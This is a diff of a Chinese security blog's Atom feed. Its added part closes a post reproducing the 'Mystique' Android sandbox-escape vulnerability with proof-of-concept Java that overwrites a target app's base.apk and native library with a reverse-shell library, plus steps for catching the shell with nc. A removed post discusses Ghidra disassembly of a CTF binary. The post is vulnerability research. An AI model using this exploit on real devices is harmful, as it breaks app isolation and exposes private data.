+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DevelopmentSettingsDashboardFragment&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RestrictedDashboardFragment&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SwitchBar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;OnSwitchChangeListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;OemUnlockDialogHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;AdbDialogHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;AdbClearKeysDialogHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LogPersistDialogHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;BluetoothA2dpHwOffloadRebootDialog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;OnA2dpHwDialogConfirmedListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;AbstractBluetoothPreferenceController&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Callback&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onActivityCreated&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Bundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;icicle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onActivityCreated&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;icicle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// Apply page-level restrictions&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;setIfOnlyAvailableForAdmins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CVE-TEST&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]begin replace&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SystemProperties&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sys.target.path&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 获取目标 APP 路径&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;TextUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CVE-TEST&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[-]can not get path from 'sys.target.path'&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootPath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sourceBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getFilesDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;base.apk&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetBase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;base.apk&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;copyFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sourceBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CVE-TEST&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]replace file: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetBase&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sourceLib&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getFilesDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;libreverse_shell.so&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetLib&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rootPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lib/x86_64/librootoperations.so&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;copyFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sourceLib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetLib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CVE-TEST&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]replace file: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetLib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CVE-TEST&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]replace done&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;copyFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;FileInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fosfrom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;FileOutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fosto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fosfrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fosto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;fosfrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;fosto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;代码&quot;&gt;代码&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/code/jd_mystique_code.zip&quot;&gt;代码相关&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;复现步骤&quot;&gt;复现步骤&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;电脑端开启 nc server，端口为 8888&lt;/li&gt;
+  &lt;li&gt;打开开发者选项，触发修改 base.apk 和 librootoperations.so 文件&lt;/li&gt;
+  &lt;li&gt;打开目标 APP，执行开启反射 shell 的 so&lt;/li&gt;
+  &lt;li&gt;电脑端 nc server 收到连接请求，此时可查询目标 APP 的私有目录&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;演示&quot;&gt;演示&lt;/h3&gt;
+
+&lt;video class=&quot;videoElement&quot; src=&quot;/assets/videos/systemapp-poc.webm&quot; controls=&quot;&quot; preload=&quot;auto&quot; width=&quot;80%&quot; height=&quot;100%&quot;&gt;&lt;/video&gt;</content><author><name>liwugang</name><email>liwugang@outlook.com</email></author><category term="Android" /><category term="Security" /><summary type="html">根据魔形女漏洞网站介绍，可以看到其漏洞可以： 打破应用沙箱机制 可攻击其他 app，读取其 app 私有数据等 应用沙箱机制，Android 是使用了 Linux 多用户机制，即每个 app 单独 uid，漏洞竟然能打破这个？看到这个就非常好奇。 这个漏洞从公布我就一直关注，直到最近 AOSP 公开了修复 patch 才搞清楚到底是怎么回事，本文记录下该漏洞的原理和使用模拟器复现该漏洞。</summary></entry><entry><title type="html">如何下载64位的apk？</title><link href="https://liwugang.github.io/2021/11/06/download_64_apk.html" rel="alternate" type="text/html" title="如何下载64位的apk？" /><published>2021-11-06T20:35:00+08:00</published><updated>2021-11-06T20:35:00+08:00</updated><id>https://liwugang.github.io/2021/11/06/download_64_apk</id><content type="html" xml:base="https://liwugang.github.io/2021/11/06/download_64_apk.html">&lt;p&gt;64位的apk指的是so库是64位的，在目前的64位架构机型上运行会更有效率，而现在新机型大多数是64位。但目前各大厂商官网提供的都是32位的apk，这样的apk能跑在所有的机型上，以牺牲了部分性能代价。其实也可以在apk里包含有32位和64位的so，但这样apk包会大不小，大厂基本上都不会这样选择。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -1392,156 +1637,4 @@ platform_app persistent_data_block_service:service_manager find&lt;span class=&q
 
 &lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
 
-&lt;p&gt;头文件信息将会打包到程序中，并且也会随时更新，所以在编译代码时要注意头文件的一致，防止不一致导致的问题。特别是在升级系统后，要注意类似问题。&lt;/p&gt;</content><author><name>liwugang</name><email>liwugang@outlook.com</email></author><category term="debug" /><summary type="html">最近下载了SELinux代码，编译了checkpolicy，但是使用时出现了段错误，本文记录下分析过程。</summary></entry><entry><title type="html">Ghidra对局部变量的标识</title><link href="https://liwugang.github.io/2020/08/01/ghidra.html" rel="alternate" type="text/html" title="Ghidra对局部变量的标识" /><published>2020-08-01T13:36:00+08:00</published><updated>2020-08-01T13:36:00+08:00</updated><id>https://liwugang.github.io/2020/08/01/ghidra</id><content type="html" xml:base="https://liwugang.github.io/2020/08/01/ghidra.html">&lt;p&gt;Ghidra函数中的局部变量，不是根据RBP的偏移，而是根据函数开始处RSP的偏移进行标识。
-&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;p&gt;使用csaw18 pwn中的&lt;a href=&quot;https://github.com/guyinatuxedo/ctf/blob/master/csaw18/pwn/boi/boi&quot;&gt;boi&lt;/a&gt;程序作为例子，来分析看ghidra对局部变量是如何标识。&lt;/p&gt;
-
-&lt;h2 id=&quot;ghidra分析结果&quot;&gt;Ghidra分析结果&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                         &lt;span class=&quot;k&quot;&gt;*******************************************************&lt;/span&gt;
-                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                      FUNCTION                       &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-                         &lt;span class=&quot;k&quot;&gt;*******************************************************&lt;/span&gt;
-                         undefined main&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-    undefined       AL:1         &amp;lt;RETURN&amp;gt;
-    undefined8      Stack[-0x10  local_10                           XREF[2]:   00400659&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
-                                                                               004006ca&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-    undefined4      Stack[-0x20  local_20                           XREF[1]:   00400677&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-    undefined8      Stack[-0x28  local_28                           XREF[1,2]: 0040066f&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
-                                                                               0040067e&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
-                                                                               004006a5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-    undefined8      Stack[-0x30  local_30                           XREF[1]:   00400667&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-    undefined8      Stack[-0x38  local_38                           XREF[2]:   0040065f&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
-                                                                               0040068f&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-    undefined4      Stack[-0x3c  local_3c                           XREF[1]:   00400649&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-    undefined8      Stack[-0x48  local_48                           XREF[1]:   0040064c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;W&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-                         main                                       XREF[5]:   Entry Point&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
-                                                                            _start:0040054d&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 
-                                                                            _start:0040054d&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 004007b4, 
-                                                                               00400868&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-      00400641               PUSH      RBP        &lt;span class=&quot;c&quot;&gt;# 入栈8字节&lt;/span&gt;
-      00400642               MOV       RBP,RSP
-      00400645               SUB       RSP,0x40
-      00400649               MOV       dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_3c],EDI
-      0040064c               MOV       qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_48],RSI
-      00400650               MOV       RAX,qword ptr FS:[0x28]
-      00400659               MOV       qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_10],RAX
-      0040065d               XOR       EAX,EAX
-      0040065f               MOV       qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_38],0x0
-      00400667               MOV       qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_30],0x0
-      0040066f               MOV       qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_28],0x0
-      00400677               MOV       dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_20],0x0
-      0040067e               MOV       dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_28+0x4],0xdeadbeef
-      00400685               MOV       &lt;span class=&quot;nv&quot;&gt;EDI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;s_Are_you_a_big_boiiiii??_00400764,s  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Are you a big boiiiii??&quot;&lt;/span&gt;
-      0040068a               CALL      puts                                       int puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; __s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-      0040068f               LEA       &lt;span class=&quot;nv&quot;&gt;RAX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;local_38,[RBP + &lt;span class=&quot;nt&quot;&gt;-0x30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# 此处 RAX=&amp;gt;local_38 是什么意思？ &lt;/span&gt;
-      00400693               MOV       EDX,0x18
-      00400698               MOV       RSI,RAX
-      0040069b               MOV       EDI,0x0
-      004006a0               CALL      &lt;span class=&quot;nb&quot;&gt;read                                       &lt;/span&gt;ssize_t &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int __fd, void 
